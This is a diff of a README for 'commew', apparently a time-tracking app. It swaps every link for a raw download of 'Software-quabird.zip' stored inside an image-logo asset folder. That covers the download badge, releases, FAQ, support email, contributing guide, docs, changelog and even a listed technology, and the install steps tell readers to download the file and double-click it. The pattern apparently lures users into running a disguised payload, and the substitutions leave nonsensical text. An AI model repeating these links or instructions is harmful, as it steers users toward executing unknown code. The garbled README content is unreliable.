@@ -6,11 +6,11 @@ Welcome to **commew**! This is a simple tool to help you track your tasks and ti
 
 ## 📥 Download
 
-[![Download commew](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip%20commew-v1.0-blue)](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip)
+[![Download commew](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip%20commew-v1.0-blue)](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip)
 
 To get started, you need to download the application. Visit the link below to download the latest version.
 
-[Download commew from Releases](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip)
+[Download commew from Releases](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip)
 
 ## ⚙️ System Requirements
 
@@ -30,7 +30,7 @@ To get started, you need to download the application. Visit the link below to do
 ## 🛠️ Installation
 
 1. **Download the Application:**
-   Go to our [Releases page](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip) and download the latest version of commew.
+   Go to our [Releases page](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip) and download the latest version of commew.
 
 2. **Install the Application:**
    Once downloaded, locate the file and double-click it to run the installation. Follow the prompts to complete the setup.
@@ -60,16 +60,16 @@ The user interface of commew is designed to be intuitive. You will find:
 ## 📞 Support
 
 If you need help:
-- Check our [FAQ](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip) for common questions.
-- Email our support team at https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip
+- Check our [FAQ](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip) for common questions.
+- Email our support team at https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip
 
 ## 🌟 Contributions
 
-We welcome contributions! If you're interested in helping us make commew better, check out our [Contributing Guidelines](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip).
+We welcome contributions! If you're interested in helping us make commew better, check out our [Contributing Guidelines](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip).
 
 ## 🛠️ Technologies Used
 
-- **https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip** for fast web applications
+- **https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip** for fast web applications
 - **TypeScript** for better scripting support
 - **Emotion** for styled components
 - **React** for creating interactive user interfaces
@@ -82,7 +82,7 @@ Join our community on Discord or follow us on Twitter for updates and tips. We l
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip)
-- [Changelog](https://raw.githubusercontent.com/mitansio/commew/main/maximization/commew.zip)
+- [Documentation](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip)
+- [Changelog](https://github.com/mitansio/commew/raw/refs/heads/main/public/assets/image/image-logo/Software-quabird.zip)
 
 Thank you for using commew! We hope it makes tracking time an enjoyable task.
